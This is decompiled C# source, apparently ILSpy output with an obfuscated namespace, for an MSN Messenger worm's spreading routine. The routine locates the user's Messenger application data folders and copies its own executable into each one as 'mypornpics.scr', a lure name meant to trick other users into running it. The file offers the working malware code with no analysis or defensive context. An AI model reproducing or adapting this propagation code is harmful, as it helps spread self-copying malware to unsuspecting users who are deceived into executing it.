using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace AdasdASDwdadwAWD;

[StandardModule]
internal sealed class msn
{
	public static void msnshare_sp()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string executablePath = default(string);
		string text = default(string);
		string[] directories = default(string[]);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 304:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_001e;
						case 5:
							goto IL_003a;
						case 6:
							goto IL_0055;
						case 7:
							goto IL_005a;
						case 8:
							goto IL_005c;
						case 9:
							goto IL_0066;
						case 10:
							goto IL_007c;
						case 11:
							goto IL_0099;
						case 12:
							goto IL_00b2;
						case 13:
						case 14:
						case 15:
							goto IL_00ca;
						default:
							goto end_IL_0000;
						case 16:
						case 17:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00ca:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_0076;
					IL_0007:
					num = 2;
					_ = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_0016;
					IL_0016:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_001e;
					IL_001e:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
					goto IL_003a;
					IL_003a:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
					{
						goto end_IL_0000_2;
					}
					goto IL_0055;
					IL_0055:
					num = 6;
					num5 = 0;
					goto IL_005a;
					IL_005a:
					num = 7;
					goto IL_005c;
					IL_005c:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_0066;
					IL_0066:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_0076;
					IL_0076:
					if (num5 > upperBound)
					{
						goto end_IL_0000_2;
					}
					goto IL_007c;
					IL_007c:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_0099;
					}
					goto IL_00ca;
					IL_0099:
					num = 11;
					if (!File.Exists(directories[num5] + "\\mypornpics.scr"))
					{
						goto IL_00b2;
					}
					goto IL_00ca;
					IL_00b2:
					num = 12;
					File.Copy(executablePath, directories[num5] + "\\mypornpics.scr");
					goto IL_00ca;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 304;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
